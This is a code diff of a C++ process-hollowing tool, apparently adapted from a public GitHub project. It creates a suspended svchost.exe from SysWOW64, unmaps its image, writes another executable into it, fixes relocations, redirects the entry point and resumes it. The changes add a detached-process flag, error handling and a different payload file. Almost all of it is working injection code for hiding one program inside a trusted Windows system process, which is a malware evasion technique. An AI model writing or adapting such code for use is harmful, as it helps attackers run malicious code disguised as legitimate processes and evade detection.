@@ -1,4 +1,5 @@
 // ProcessHollowing.cpp : Defines the entry point for the console application.
+// Taken from https://github.com/m0n0ph1/Process-Hollowing
 
 #include "stdafx.h"
 #include <windows.h>
@@ -12,20 +13,21 @@ void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
 
 	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
 	LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
-	
+
 	CreateProcessA
 	(
 		0,
-		pDestCmdLine,		
-		0, 
-		0, 
-		0, 
-		CREATE_SUSPENDED, 
-		0, 
-		0, 
-		pStartupInfo, 
+		pDestCmdLine,
+		0,
+		0,
+		0,
+		CREATE_SUSPENDED | DETACHED_PROCESS,
+		0,
+		0,
+		pStartupInfo,
 		pProcessInfo
 	);
+
 
 	if (!pProcessInfo->hProcess)
 	{
@@ -33,6 +35,8 @@ void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
 
 		return;
 	}
+
+	printf("Created process with id %d\r\n", pProcessInfo->dwProcessId);
 
 	PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);
 
@@ -43,11 +47,11 @@ void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
 	HANDLE hFile = CreateFileA
 	(
 		pSourceFile,
-		GENERIC_READ, 
-		0, 
-		0, 
-		OPEN_ALWAYS, 
-		0, 
+		GENERIC_READ,
+		0,
+		0,
+		OPEN_ALWAYS,
+		0,
 		0
 	);
 
@@ -77,7 +81,7 @@ void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
 
 	DWORD dwResult = NtUnmapViewOfSection
 	(
-		pProcessInfo->hProcess, 
+		pProcessInfo->hProcess,
 		pPEB->ImageBaseAddress
 	);
 
@@ -100,7 +104,8 @@ void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
 
 	if (!pRemoteImage)
 	{
-		printf("VirtualAllocEx call failed\r\n");
+		printf("VirtualAllocEx call failed with error %d \r\n", GetLastError());
+		TerminateProcess(pProcessInfo->hProcess, 0);
 		return;
 	}
 
@@ -123,10 +128,10 @@ void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
 
 	if (!WriteProcessMemory
 	(
-		pProcessInfo->hProcess, 				
-		pPEB->ImageBaseAddress, 
-		pBuffer, 
-		pSourceHeaders->OptionalHeader.SizeOfHeaders, 
+		pProcessInfo->hProcess,
+		pPEB->ImageBaseAddress,
+		pBuffer,
+		pSourceHeaders->OptionalHeader.SizeOfHeaders,
 		0
 	))
 	{
@@ -140,29 +145,29 @@ void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
 		if (!pSourceImage->Sections[x].PointerToRawData)
 			continue;
 
-		PVOID pSectionDestination = 
+		PVOID pSectionDestination =
 			(PVOID)((DWORD)pPEB->ImageBaseAddress + pSourceImage->Sections[x].VirtualAddress);
 
 		printf("Writing %s section to 0x%p\r\n", pSourceImage->Sections[x].Name, pSectionDestination);
 
 		if (!WriteProcessMemory
 		(
-			pProcessInfo->hProcess,			
-			pSectionDestination,			
+			pProcessInfo->hProcess,
+			pSectionDestination,
 			&pBuffer[pSourceImage->Sections[x].PointerToRawData],
 			pSourceImage->Sections[x].SizeOfRawData,
 			0
 		))
 		{
-			printf ("Error writing process memory\r\n");
+			printf("Error writing process memory\r\n");
 			return;
 		}
-	}	
+	}
 
 	if (dwDelta)
 		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
 		{
-			char* pSectionName = ".reloc";		
+			char* pSectionName = ".reloc";
 
 			if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
 				continue;
@@ -172,35 +177,35 @@ void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
 			DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
 			DWORD dwOffset = 0;
 
-			IMAGE_DATA_DIRECTORY relocData = 
+			IMAGE_DATA_DIRECTORY relocData =
 				pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
 
 			while (dwOffset < relocData.Size)
 			{
-				PBASE_RELOCATION_BLOCK pBlockheader = 
+				PBASE_RELOCATION_BLOCK pBlockheader =
 					(PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset];
 
 				dwOffset += sizeof(BASE_RELOCATION_BLOCK);
 
 				DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);
 
-				PBASE_RELOCATION_ENTRY pBlocks = 
+				PBASE_RELOCATION_ENTRY pBlocks =
 					(PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset];
 
-				for (DWORD y = 0; y <  dwEntryCount; y++)
+				for (DWORD y = 0; y < dwEntryCount; y++)
 				{
 					dwOffset += sizeof(BASE_RELOCATION_ENTRY);
 
 					if (pBlocks[y].Type == 0)
 						continue;
 
-					DWORD dwFieldAddress = 
+					DWORD dwFieldAddress =
 						pBlockheader->PageAddress + pBlocks[y].Offset;
 
 					DWORD dwBuffer = 0;
 					ReadProcessMemory
 					(
-						pProcessInfo->hProcess, 
+						pProcessInfo->hProcess,
 						(PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
 						&dwBuffer,
 						sizeof(DWORD),
@@ -232,58 +237,58 @@ void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
 		}
 
 
-		DWORD dwBreakpoint = 0xCC;
+	DWORD dwBreakpoint = 0xCC;
 
-		DWORD dwEntrypoint = (DWORD)pPEB->ImageBaseAddress +
-			pSourceHeaders->OptionalHeader.AddressOfEntryPoint;
+	DWORD dwEntrypoint = (DWORD)pPEB->ImageBaseAddress +
+		pSourceHeaders->OptionalHeader.AddressOfEntryPoint;
 
 #ifdef WRITE_BP
-		printf("Writing breakpoint\r\n");
+	printf("Writing breakpoint\r\n");
 
-		if (!WriteProcessMemory
-			(
-			pProcessInfo->hProcess, 
-			(PVOID)dwEntrypoint, 
-			&dwBreakpoint, 
-			4, 
-			0
-			))
-		{
-			printf("Error writing breakpoint\r\n");
-			return;
-		}
+	if (!WriteProcessMemory
+	(
+		pProcessInfo->hProcess,
+		(PVOID)dwEntrypoint,
+		&dwBreakpoint,
+		4,
+		0
+	))
+	{
+		printf("Error writing breakpoint\r\n");
+		return;
+	}
 #endif
 
-		LPCONTEXT pContext = new CONTEXT();
-		pContext->ContextFlags = CONTEXT_INTEGER;
+	LPCONTEXT pContext = new CONTEXT();
+	pContext->ContextFlags = CONTEXT_INTEGER;
 
-		printf("Getting thread context\r\n");
+	printf("Getting thread context\r\n");
 
-		if (!GetThreadContext(pProcessInfo->hThread, pContext))
-		{
-			printf("Error getting context\r\n");
-			return;
-		}
+	if (!GetThreadContext(pProcessInfo->hThread, pContext))
+	{
+		printf("Error getting context\r\n");
+		return;
+	}
 
-		pContext->Eax = dwEntrypoint;			
+	pContext->Eax = dwEntrypoint;
 
-		printf("Setting thread context\r\n");
+	printf("Setting thread context\r\n");
 
-		if (!SetThreadContext(pProcessInfo->hThread, pContext))
-		{
-			printf("Error setting context\r\n");
-			return;
-		}
+	if (!SetThreadContext(pProcessInfo->hThread, pContext))
+	{
+		printf("Error setting context\r\n");
+		return;
+	}
 
-		printf("Resuming thread\r\n");
+	printf("Resuming thread\r\n");
 
-		if (!ResumeThread(pProcessInfo->hThread))
-		{
-			printf("Error resuming thread\r\n");
-			return;
-		}
+	if (!ResumeThread(pProcessInfo->hThread))
+	{
+		printf("Error resuming thread\r\n");
+		return;
+	}
 
-		printf("Process hollowing complete\r\n");
+	printf("Process hollowing complete\r\n");
 }
 
 int _tmain(int argc, _TCHAR* argv[])
@@ -291,15 +296,13 @@ int _tmain(int argc, _TCHAR* argv[])
 	char* pPath = new char[MAX_PATH];
 	GetModuleFileNameA(0, pPath, MAX_PATH);
 	pPath[strrchr(pPath, '\\') - pPath + 1] = 0;
-	strcat(pPath, "helloworld.exe");
-	
+	strcat(pPath, "ollydbg.exe");
+
 	CreateHollowedProcess
 	(
-		"svchost", 
+		"C:\\Windows\\SysWOW64\\svchost.exe",
 		pPath
 	);
-
-	system("pause");
 
 	return 0;
 }
